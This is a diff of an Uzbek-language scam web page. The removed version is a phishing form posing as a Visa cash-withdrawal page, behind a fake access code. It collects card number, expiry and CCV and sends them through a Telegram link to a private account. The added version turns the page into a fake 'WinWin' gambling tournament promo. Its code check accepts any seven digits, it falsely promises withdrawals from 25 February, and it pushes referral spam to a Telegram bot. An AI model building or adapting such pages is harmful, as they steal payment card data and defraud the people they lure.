@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Pul yechish · Visa</title>
+    <title>WinWin · Katta turnir</title>
     <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -26,7 +26,7 @@
             background-color: #0b1a2e;
         }
 
-        /* Yarim shaffof fon rasmi */
+        /* WinWin fon rasmi – 50% shaffof */
         body::before {
             content: "";
             position: fixed;
@@ -34,7 +34,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('https://images.pexels.com/photos/4101143/pexels-photo-4101143.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2');
+            background-image: url('https://winwinbet.app/wp-content/uploads/2025/04/WinWin-Bet-Official-1024x559.webp');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
@@ -43,17 +43,17 @@
             pointer-events: none;
         }
 
-        /* Umumiy karta uslubi */
+        /* Asosiy karta (umumiy uslub) */
         .card {
             width: 100%;
-            max-width: 440px;
-            background: rgba(255, 255, 255, 0.9);
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.92);
             backdrop-filter: blur(8px);
             -webkit-backdrop-filter: blur(8px);
-            border-radius: 32px;
-            padding: 28px 24px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25), 0 8px 16px rgba(0, 0, 0, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 36px;
+            padding: 32px 28px;
+            box-shadow: 0 25px 45px rgba(0, 30, 10, 0.4), 0 10px 20px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.5);
             transition: all 0.2s;
         }
 
@@ -62,17 +62,20 @@
             display: block;
         }
 
-        /* Pul yechish bo'limi (dastlab yashirin) */
-        #withdrawSection {
+        /* Aksiya (pul yechish) bo'limi – dastlab yashirin */
+        #promoSection {
             display: none;
         }
 
-        .card h2 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #0b1a2e;
+        .code-header {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #1c2e3f;
             margin-bottom: 8px;
-            letter-spacing: -0.5px;
+        }
+
+        .code-header span {
+            color: #00a86b;
         }
 
         .subhead {
@@ -80,48 +83,43 @@
             color: #2c3e50;
             margin-bottom: 28px;
             font-weight: 500;
-            opacity: 0.85;
-            border-left: 4px solid #1a73e8;
+            border-left: 4px solid #00c853;
             padding-left: 14px;
-            background: linear-gradient(90deg, rgba(26,115,232,0.05) 0%, rgba(255,255,255,0) 100%);
+            background: linear-gradient(90deg, rgba(0,200,83,0.1) 0%, rgba(255,255,255,0) 100%);
             border-radius: 0 8px 8px 0;
         }
 
         .input-group {
-            margin-bottom: 20px;
-            position: relative;
+            margin-bottom: 24px;
         }
 
         .input-group label {
             display: flex;
             align-items: center;
-            gap: 6px;
-            font-size: 14px;
+            gap: 8px;
+            font-size: 15px;
             font-weight: 600;
             color: #1e2b3a;
-            margin-bottom: 6px;
-        }
-
-        .input-group label i {
-            font-size: 18px;
-            color: #1a73e8;
+            margin-bottom: 8px;
         }
 
         .input-field {
             width: 100%;
-            padding: 16px 18px;
-            font-size: 16px;
+            padding: 18px 20px;
+            font-size: 20px;
             background: white;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 30px;
             outline: none;
             transition: border 0.2s, box-shadow 0.2s;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+            text-align: center;
+            letter-spacing: 4px;
+            font-weight: 600;
         }
 
         .input-field:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 8px 18px -8px rgba(26,115,232,0.3);
+            border-color: #00c853;
+            box-shadow: 0 8px 18px -8px #00a86b;
         }
 
         .input-field.error {
@@ -129,355 +127,375 @@
             background-color: #fff5f5;
         }
 
-        .row-fields {
-            display: flex;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        .row-fields .input-group {
-            flex: 1 1 0;
-            min-width: 120px;
-        }
-
         .hint-text {
-            font-size: 12px;
-            color: #5f6b7a;
-            margin-top: 5px;
+            font-size: 13px;
+            color: #2c5e3a;
+            margin-top: 10px;
             display: flex;
             align-items: center;
-            gap: 4px;
-        }
-
-        .hint-text i {
-            font-size: 14px;
-            color: #1a73e8;
-        }
-
-        .amount-wrapper {
-            position: relative;
-        }
-
-        .amount-wrapper::before {
-            content: "so'm";
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-weight: 600;
-            color: #1a73e8;
-            background: #e9f0fd;
-            padding: 4px 8px;
-            border-radius: 30px;
-            font-size: 14px;
-            pointer-events: none;
+            gap: 6px;
+            background: #e6ffee;
+            padding: 8px 16px;
+            border-radius: 40px;
         }
 
         .btn-submit {
             width: 100%;
-            background: linear-gradient(145deg, #1a73e8, #0d47a1);
+            background: linear-gradient(145deg, #00c853, #00a86b);
             color: white;
             font-weight: 700;
-            font-size: 18px;
+            font-size: 20px;
             padding: 18px 20px;
             border: none;
-            border-radius: 30px;
+            border-radius: 50px;
             margin-top: 20px;
             cursor: pointer;
-            box-shadow: 0 10px 20px -7px #0d47a1;
+            box-shadow: 0 15px 25px -8px #00662b;
             transition: all 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            border: 1px solid rgba(255,255,255,0.3);
+            border: 1px solid #b9f6ca;
         }
 
         .btn-submit:hover {
-            background: linear-gradient(145deg, #0d47a1, #0a356b);
+            background: linear-gradient(145deg, #00b34a, #00803f);
             transform: scale(1.02);
-            box-shadow: 0 15px 25px -8px #0d2e5e;
         }
 
         .btn-submit:active {
             transform: scale(0.98);
         }
 
-        .visa-badge {
-            display: inline-flex;
-            align-items: center;
-            background: rgba(26,115,232,0.12);
-            padding: 6px 14px;
-            border-radius: 40px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #0d47a1;
-            margin-bottom: 16px;
-            border: 1px dashed #1a73e8;
+        /* Promotion (aksiya) dizayni – to‘liq yashil */
+        .tournament-badge {
+            background: #00c853;
+            color: white;
+            font-weight: 700;
+            font-size: 0.95rem;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 18px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 14px -6px #00662b;
+            border: 1px solid #b9f6ca;
+            text-transform: uppercase;
         }
 
-        .visa-badge::before {
-            content: "💳";
-            margin-right: 6px;
-            font-size: 16px;
+        h1 {
+            font-size: 2.1rem;
+            font-weight: 800;
+            color: #1c2e3f;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        h1 span {
+            color: #00a86b;
+            background: linear-gradient(145deg, #00e676, #00c853);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .highlight-green {
+            background: #ccffd9;
+            color: #006435;
+            font-weight: 600;
+            padding: 4px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 8px 0 16px 0;
+            border-left: 5px solid #00c853;
+            font-size: 1.1rem;
+        }
+
+        .prize-block {
+            background: rgba(0, 200, 83, 0.1);
+            border-radius: 28px;
+            padding: 24px 20px;
+            margin: 20px 0;
+            border: 2px dashed #00c853;
+            box-shadow: 0 10px 20px -8px rgba(0, 150, 0, 0.3);
+        }
+
+        .prize-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #00a86b;
+            line-height: 1.2;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .prize-title span {
+            font-size: 2.2rem;
+        }
+
+        .list-check {
+            list-style: none;
+            margin: 16px 0;
+        }
+
+        .list-check li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #1b3b2b;
+            margin-bottom: 16px;
+            background: rgba(255,255,255,0.6);
+            padding: 10px 16px;
+            border-radius: 40px;
+            border: 1px solid #b9f6ca;
+        }
+
+        .list-check li::before {
+            content: "✅";
+            font-size: 1.3rem;
+            background: #00c853;
+            color: white;
+            border-radius: 50%;
+            padding: 4px;
+        }
+
+        .withdraw-closed {
+            background: #1b3b2b;
+            color: white;
+            padding: 20px;
+            border-radius: 28px;
+            margin: 28px 0 20px;
+            background: linear-gradient(135deg, #1e5f3a, #003d1f);
+            border: 1px solid #00e676;
+            box-shadow: 0 15px 25px -10px #004d26;
+        }
+
+        .closed-label {
+            font-size: 1.2rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #ffd600;
+            color: #1a3a2a;
+            padding: 6px 16px;
+            border-radius: 40px;
+            width: fit-content;
+            margin-bottom: 16px;
+            font-weight: 700;
+        }
+
+        .date-official {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #ffd600;
+            text-shadow: 0 2px 5px #00000030;
+            line-height: 1.2;
+        }
+
+        .date-official small {
+            font-size: 1rem;
+            color: #b9f6ca;
+            font-weight: 400;
+            display: block;
+        }
+
+        .btn-telegram {
+            width: 100%;
+            background: #00c853;
+            color: #002916;
+            font-weight: 800;
+            font-size: 1.3rem;
+            padding: 20px 18px;
+            border: none;
+            border-radius: 50px;
+            margin: 16px 0 10px;
+            cursor: pointer;
+            box-shadow: 0 15px 25px -8px #00662b;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            border: 2px solid #b9f6ca;
+        }
+
+        .btn-telegram:hover {
+            background: #00b34a;
+            transform: scale(1.02);
         }
 
         footer {
             margin-top: 24px;
             text-align: center;
-            font-size: 13px;
-            color: #3a4a5c;
-            opacity: 0.75;
-            border-top: 1px solid rgba(0,0,0,0.1);
+            font-size: 0.9rem;
+            color: #1d3b2b;
+            opacity: 0.9;
+            border-top: 1px solid #a5d6a5;
             padding-top: 16px;
+            font-weight: 500;
         }
 
-        /* kod uchun alohida stil */
-        .code-hint {
-            text-align: center;
-            font-size: 14px;
-            color: #1a73e8;
-            background: rgba(26,115,232,0.1);
-            padding: 10px;
+        .visa-icon {
+            background: #1434cb;
+            color: white;
+            padding: 4px 12px;
             border-radius: 30px;
-            margin-bottom: 10px;
-            border: 1px dashed #1a73e8;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: inline-block;
+            margin-right: 6px;
         }
 
         @media (max-width: 480px) {
             .card {
-                padding: 22px 16px;
-                border-radius: 28px;
+                padding: 24px 18px;
             }
-            .row-fields {
-                gap: 12px;
+            .code-header {
+                font-size: 1.8rem;
             }
-            .input-field {
-                padding: 14px 16px;
-                font-size: 15px;
+            h1 {
+                font-size: 1.8rem;
             }
-            .btn-submit {
-                padding: 16px;
-                font-size: 17px;
+            .prize-title {
+                font-size: 1.5rem;
+            }
+            .date-official {
+                font-size: 1.8rem;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- ASOSIY KONTAINER: ikkala bo'lim ham bir xil card uslubida -->
-    <div class="card">
-        <!-- 7 XONALI KOD KIRITISH QISMI -->
-        <div id="codeSection">
-            <h2>🔐 Maxfiy kod</h2>
-            <div class="subhead">kirish uchun 7 xonali raqamni kiriting</div>
-            <div class="code-hint">⚡ telegram bot bergan kodni kiriting</div>
-            <div class="input-group">
-                <label><span class="icon">🔑</span> 7 xonali kod</label>
-                <input type="text" id="accessCode" class="input-field" placeholder="0000000" maxlength="7" inputmode="numeric" autocomplete="off">
-                <div class="hint-text"><span class="icon">📌</span> kod 7 ta belgidan iborat</div>
+<div class="card">
+    <!-- 7 XONALI KOD KIRITISH QISMI -->
+    <div id="codeSection">
+        <div class="code-header">🔐 <span>bot taqdim etgan</span> kod</div>
+        <div class="subhead">Kirish uchun maxsus raqamni kiriting</div>
+        <div class="input-group">
+            <label><span>🔑</span> Maxfiy kod </label>
+            <input type="text" id="accessCode" class="input-field" placeholder="0 0 0 0 0 0 0" maxlength="7" inputmode="numeric" autocomplete="off">
+            <div class="hint-text">
+                <span>📌</span> kodni togri kiriting sovgalar tarqatilyotganda xato kod uchun berilmaydi !ETIBORLI BO'LING
             </div>
-            <button class="btn-submit" id="verifyCodeBtn">
-                <span>✅</span> Tasdiqlash
-            </button>
-            <footer>
-                ⚡ kodni tasdiqlab, pul yechish oynasiga o‘ting
-            </footer>
         </div>
-
-        <!-- PUL YECHISH FORMA QISMI (dastlab yashirin) -->
-        <div id="withdrawSection">
-            <div class="visa-badge">faqat Visa kartalar uchun</div>
-            <h2>💸 Pul yechish</h2>
-            <div class="subhead">maʼlumotlarni toʻldiring va tasdiqlang</div>
-
-            <form id="withdrawForm">
-                <!-- Karta raqami -->
-                <div class="input-group">
-                    <label><span class="icon">💳</span> Karta raqami (Visa)</label>
-                    <input type="text" id="cardNumber" class="input-field" placeholder="karta raqami kiriting" maxlength="19" inputmode="numeric" autocomplete="cc-number">
-                    <div class="hint-text"><span class="icon">🔒</span>  faqat Visa </div>
-                </div>
-
-                <!-- Amal qilish muddati va CCV yonma-yon -->
-                <div class="row-fields">
-                    <div class="input-group">
-                        <label><span class="icon">📅</span> amal qilish muddat</label>
-                        <input type="text" id="expiry" class="input-field" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
-                    </div>
-                    <div class="input-group">
-                        <label><span class="icon">🔐</span> CCV</label>
-                        <input type="text" id="ccv" class="input-field" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="off">
-                    </div>
-                </div>
-
-                <!-- Yechish summasi -->
-                <div class="input-group">
-                    <label><span class="icon">💰</span> Yechmoqchi boʻlgan summa</label>
-                    <div class="amount-wrapper">
-                        <input type="text" id="amount" class="input-field" placeholder="25000" inputmode="numeric">
-                    </div>
-                    <div class="hint-text"><span class="icon">⬆️</span> Minimal 25 000 so‘m</div>
-                </div>
-
-                <!-- Yuborish tugmasi -->
-                <button type="submit" class="btn-submit" id="submitBtn">
-                    <span>💰 </span> Pul yechish
-                </button>
-            </form>
-            <footer>
-                ⚡ so‘rov Telegram orqali jo‘natiladi
-            </footer>
-        </div>
+        <button class="btn-submit" id="verifyCodeBtn">
+            <span>✅</span> Tasdiqlash
+        </button>
+        <footer style="border-top-color: #b9f6ca;">
+            💬 Kodni kiriting va WinWin turniriga o‘ting
+        </footer>
     </div>
 
-    <script>
-        (function() {
-            // Elementlar
-            const codeSection = document.getElementById('codeSection');
-            const withdrawSection = document.getElementById('withdrawSection');
-            const accessCodeInput = document.getElementById('accessCode');
-            const verifyBtn = document.getElementById('verifyCodeBtn');
+    <!-- WINWIN TURNIR AKSIYASI (PUL YECHISH YOPIQ) -->
+    <div id="promoSection">
+        <div class="tournament-badge">🏆 WINWIN KATTA TURNIR 🏆</div>
+        <h1>100 ga yaqin <span>sovg‘alar</span></h1>
+        <div class="highlight-green">⚡ faqat referral orqali ⚡</div>
 
-            // Kodni tekshirish va pul yechish oynasini ochish
-            verifyBtn.addEventListener('click', function() {
-                let code = accessCodeInput.value.trim();
+        <div class="prize-block">
+            <div class="prize-title">
+                <span>🎁</span> Qimmatbaho sovg‘alar
+            </div>
+            <ul class="list-check">
+                <li>1 marta referral orqali to‘plangan summani yechish</li>
+                <li>Ko‘proq odam chaqiring – katta yutuq</li>
+                <li>100 ga yaqin sovg‘alar uchun imkoniyat</li>
+            </ul>
+            <p style="font-weight: 600; color: #006435; background: white; padding: 8px 16px; border-radius: 40px; margin: 0;">
+                🔥 Ko‘proq chaqir, yutug‘ni oling!
+            </p>
+        </div>
 
-                // 1. Faqat raqamlar va uzunligi 7 ga tengligini tekshirish
-                const isNumeric = /^\d+$/.test(code);  // faqat raqamlar
-                if (code.length === 7 && isNumeric) {
-                    // To'g'ri kod: kod bo'limini yashir, withdraw bo'limini ko'rsat
-                    codeSection.style.display = 'none';
-                    withdrawSection.style.display = 'block';
-                    // xatolik klassini olib tashlash (agar oldin qo'shilgan bo'lsa)
-                    accessCodeInput.classList.remove('error');
-                } else {
-                    // Xato: maydonni qizil qilish va alert
-                    accessCodeInput.classList.add('error');
-                    alert('Xato: 7 xonali raqam kiriting (faqat 0-9). Masalan: 1234567');
-                }
-            });
+        <!-- PUL YECHISH VAQTINCHA YOPIQ XABARI (YASHIL) -->
+        <div class="withdraw-closed">
+            <div class="closed-label">
+                <i>⏳</i> PUL YECHISH VAQTINCHA YOPIQ
+            </div>
+            <div style="font-size: 1.1rem; margin-bottom: 16px; font-weight: 500; color: #e0f2e0;">
+                💬 Toplangan mablaglarni 25 fevral 2026 yil yechib olinishi mumkin winwin.bet biz bilan yutuqlar yaqinroq
+            </div>
+            <div class="date-official">
+                25 FEVRAL
+                <small>rasmiy sana</small>
+            </div>
+            <div style="margin-top: 18px; background: #2d7a4b; padding: 12px; border-radius: 30px; color: white; font-weight: 500; text-align: center; border: 1px solid #a5d6a5;">
+                ✔️ Ayni damda turnir aksiyasi davom etmoqda
+            </div>
+        </div>
 
-            // Kod maydoniga faqat raqam kiritishga ruxsat (ixtiyoriy)
-            accessCodeInput.addEventListener('input', function(e) {
-                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 7);
-                // Xatolik klassini olib tashlash (foydalanuvchi tuzatayotganda)
-                this.classList.remove('error');
-            });
+        <!-- Referral tugmasi (Telegram orqali ulashish) -->
+        <button class="btn-telegram" id="referralBtn">
+            <span>📢</span> Odamlarni chaqirish
+        </button>
 
-            // Enter bosilganda ham tasdiqlash ishlasin
-            accessCodeInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    verifyBtn.click();
-                }
-            });
+        <footer>
+            <span class="visa-icon">💳 Visa</span> to‘lov tizimi qo‘llab-quvvatlanadi · 25 fevraldan boshlab yechish
+        </footer>
+    </div>
+</div>
 
-            // PUL YECHISH FORMASI (avvalgi kod asosida)
-            const form = document.getElementById('withdrawForm');
-            const cardInput = document.getElementById('cardNumber');
-            const expiryInput = document.getElementById('expiry');
-            const ccvInput = document.getElementById('ccv');
-            const amountInput = document.getElementById('amount');
+<script>
+    (function() {
+        // Elementlar
+        const codeSection = document.getElementById('codeSection');
+        const promoSection = document.getElementById('promoSection');
+        const accessCodeInput = document.getElementById('accessCode');
+        const verifyBtn = document.getElementById('verifyCodeBtn');
 
-            // Karta raqamiga bo'shliq qo'yish
-            cardInput.addEventListener('input', function(e) {
-                let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
-                let parts = [];
-                for (let i = 0; i < val.length; i += 4) {
-                    parts.push(val.substr(i, 4));
-                }
-                e.target.value = parts.length ? parts.join(' ') : val;
-            });
+        // Kodni tekshirish va aksiyani ochish
+        verifyBtn.addEventListener('click', function() {
+            let code = accessCodeInput.value.trim();
 
-            // Amal qilish muddatiga "/" qo'yish
-            expiryInput.addEventListener('input', function(e) {
-                let val = e.target.value.replace(/\//g, '').replace(/[^0-9]/g, '');
-                if (val.length >= 2) {
-                    e.target.value = val.substr(0, 2) + '/' + val.substr(2, 2);
-                } else {
-                    e.target.value = val;
-                }
-            });
+            // 7 xonali raqam bo'lishi kerak (faqat 0-9)
+            const isNumeric = /^\d+$/.test(code);
+            if (code.length === 7 && isNumeric) {
+                // To'g'ri: kod bo'limini yashir, promoSectionni ko'rsat
+                codeSection.style.display = 'none';
+                promoSection.style.display = 'block';
+                accessCodeInput.classList.remove('error');
+            } else {
+                // Xato: maydonni qizil qilish
+                accessCodeInput.classList.add('error');
+                alert('Xato: bot taqdim etgan kodni kiriting');
+            }
+        });
 
-            // CCV faqat raqam
-            ccvInput.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/[^0-9]/g, '').substr(0, 4);
-            });
+        // Kod maydoniga faqat raqam kiritish va xatolikni olib tashlash
+        accessCodeInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 7);
+            this.classList.remove('error');
+        });
 
-            // Summa faqat raqam
-            amountInput.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/[^0-9]/g, '');
-            });
-
-            // Formani yuborish (pul yechish)
-            form.addEventListener('submit', function(e) {
+        // Enter bosilganda ham tasdiqlash
+        accessCodeInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
                 e.preventDefault();
+                verifyBtn.click();
+            }
+        });
 
-                // Ma'lumotlarni olish
-                let rawCard = cardInput.value.replace(/\s+/g, '');
-                let expiry = expiryInput.value.trim();
-                let ccv = ccvInput.value.trim();
-                let amount = amountInput.value.trim();
+        // Referral tugmasi (Telegram orqali ulashish)
+        const referralBtn = document.getElementById('referralBtn');
+        referralBtn.addEventListener('click', function() {
+            const message = "Men WinWin katta turnir aksiyasida ishtirok etmoqdaman! 100 ga yaqin sovg‘alarni yutib olish imkoniyati bor. Faqat referral orqali to‘plangan summani 1 marta yechish mumkin. Ko‘proq odam chaqiring va yutib oling! 🎁 Pul yechish 25 fevralda ochiladi. sen ham ishtirok et t.me/Winwin_premium_bonusbot";
+            const encoded = encodeURIComponent(message);
+            // Telegram share orqali yuborish
+            if (confirm("Telegram orqali do‘stlaringizga turnir haqida yuborasizmi?")) {
+                window.open(`https://t.me/share/url?url=${encoded}&text=${encoded}`, '_blank');
+            }
+        });
 
-                // Validatsiya
-                let errors = [];
+        // Visa haqida eslatma (ixtiyoriy)
+    })();
+</script>
 
-                if (!rawCard) errors.push('Karta raqamini kiriting');
-                else if (!/^\d{16}$/.test(rawCard)) errors.push('Karta raqami 16 xonali bo‘lishi kerak');
-                else if (rawCard[0] !== '4') errors.push('Faqat Visa kartalar qabul qilinadi (4 bilan boshlanishi kerak)');
-
-                if (!expiry) errors.push('Amal qilish muddatini kiriting');
-                else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) errors.push('Muddat formati MM/YY (masalan 12/25)');
-
-                if (!ccv) errors.push('CCV kodini kiriting');
-                else if (!/^\d{3,4}$/.test(ccv)) errors.push('CCV 3 yoki 4 raqam');
-
-                if (!amount) errors.push('Summani kiriting');
-                else {
-                    let amountNum = parseInt(amount, 10);
-                    if (isNaN(amountNum) || amountNum < 25000) errors.push('Minimal yechish miqdori 25 000 so‘m');
-                }
-
-                // Xatoliklarni ko'rsatish
-                if (errors.length > 0) {
-                    alert('Xatoliklar:\n- ' + errors.join('\n- '));
-                    [cardInput, expiryInput, ccvInput, amountInput].forEach(i => i.classList.remove('error'));
-                    if (!rawCard || rawCard.length !== 16 || rawCard[0] !== '4') cardInput.classList.add('error');
-                    if (!expiry || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) expiryInput.classList.add('error');
-                    if (!ccv || !/^\d{3,4}$/.test(ccv)) ccvInput.classList.add('error');
-                    if (!amount || parseInt(amount,10) < 25000) amountInput.classList.add('error');
-                    return;
-                }
-
-                // Xatolik bo'lmasa, xabar tuzish
-                const message = `men pul yechmoqchiman\n` +
-                                `💳 Karta: ${rawCard.match(/.{1,4}/g).join(' ')}\n` +
-                                `📅 Muddat: ${expiry}\n` +
-                                `🔐 CCV: ${ccv}\n` +
-                                `💰 Summa: ${parseInt(amount, 10).toLocaleString()} so‘m`;
-
-                const telegramUsername = 'Vlad_admin_ru_uz';
-                const encodedMessage = encodeURIComponent(message);
-                const telegramUrl = `https://t.me/${telegramUsername}?text=${encodedMessage}`;
-
-                const confirmSend = confirm(`tolov malumotlari ban transfer ga yuboriladi:\n\n${message}\n\n"OK" ni bosing va Telegram orqali yuboring.`);
-                if (confirmSend) {
-                    window.open(telegramUrl, '_blank');
-                }
-            });
-
-            // Karta raqamida Visa tekshiruvi (blur)
-            cardInput.addEventListener('blur', function() {
-                let val = this.value.replace(/\s/g, '');
-                if (val.length > 0 && val[0] !== '4') {
-                    cardInput.classList.add('error');
-                } else {
-                    cardInput.classList.remove('error');
-                }
-            });
-
-        })();
-    </script>
+<!-- Izoh: kod 7 xonali istalgan raqam bo‘lishi mumkin. -->
 </body>
 </html>
